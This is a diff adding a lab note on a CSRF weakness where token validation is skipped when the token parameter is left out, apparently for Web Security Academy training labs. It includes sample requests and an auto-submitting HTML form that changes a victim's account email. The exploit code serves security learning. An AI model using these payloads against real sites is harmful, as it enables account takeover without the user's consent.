@@ -39,4 +39,27 @@ GET /my-account/change-email?email=test1%40vendor1.test&csrf=lft4aa7bYzBpejN5phs
   document.forms[0].submit();
 </script>
 
+===
+
+CSRF where token validation depends on token being present
+
+// target endpoint:
+POST /my-account/change-email HTTP/2
+email=newemail%40vendor.test&csrf=T1aUoLBOmDsmOxk9u0NPq4zMu0D0bQ8R
+
+// modifying token returns 400
+email=newemail%40vendor.test&csrf=T1aUoLBOmDsmOxk9u0NPq4zMu0D0bQ8R5
+
+// however, if we remove the token param entirely, it works
+email=newemail%40vendor.test
+
+// exploit template:
+<form method="POST" action="https://0ac0008103ab3f35803d0da6005200f1.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="newemail@attacker.test">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
 
